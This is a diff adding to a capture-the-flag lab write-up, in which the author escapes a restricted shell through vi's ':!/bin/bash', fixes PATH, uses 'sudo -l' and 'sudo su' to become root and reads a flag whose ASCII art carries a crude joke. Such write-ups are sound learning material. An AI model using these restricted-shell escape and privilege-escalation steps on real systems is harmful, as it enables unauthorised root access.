@@ -230,4 +230,67 @@ guest@porteus:~$ ls /home/guest/
 
 The directory that stands out in this listing is the "prog", so I type in "ls /home/guest/prog/" and when I press TAB it automatically fills in "ls /home/guest/prog/vi". Could that mean I'm allowed to run vi? YES! (afterwards I learn that I could have just typed in "echo $PATH" and I would've found out guest's path is /home/gues/prog).
 
-A funny thing about vi is that there's a way of running commands from inside a vi prompt, by typing ":!<COMMAND>" 
+A funny thing about vi is that there's a way of running commands from inside a vi prompt, by typing ":!<COMMAND>", so I do it: enter vi command and type in ":!/bin/bash" to escape it:
+
+```
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+bash: grep: command not found
+bash: ps: command not found
+bash: ps: command not found
+bash: ps: command not found
+bash: ps: command not found
+bash: ps: command not found
+bash: ps: command not found
+guest@porteus:~$ 
+```
+
+The next thing I do is add /bin and /usr/bin to my PATH variable: 
+
+```
+guest@porteus:~$ export PATH=/bin:/usr/bin:$PATH
+guest@porteus:~$ echo $PATH
+/bin:/usr/bin:/home/guest/prog
+```
+
+Next up I try escalating privilege. I type in "sudo -l":
+
+```
+guest@porteus:~$ sudo -l
+User guest may run the following commands on porteus:
+    (ALL) ALL
+    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
+    (trinity) NOPASSWD: /bin/cp
+```
+
+Then I run "sudo su" and enter the same credential used for ssh, get root and get the flag:
+
+```
+root@porteus:/home/guest# cat /root/flag.txt 
+   _,-.                                                             
+,-'  _|                  EVER REWIND OVER AND OVER AGAIN THROUGH THE
+|_,-O__`-._              INITIAL AGENT SMITH/NEO INTERROGATION SCENE
+|`-._\`.__ `_.           IN THE MATRIX AND BEAT OFF                 
+|`-._`-.\,-'_|  _,-'.                                               
+     `-.|.-' | |`.-'|_     WHAT                                     
+        |      |_|,-'_`.                                            
+              |-._,-'  |     NO, ME NEITHER                         
+         jrei | |    _,'                                            
+              '-|_,-'          IT'S JUST A HYPOTHETICAL QUESTION    
+
+```
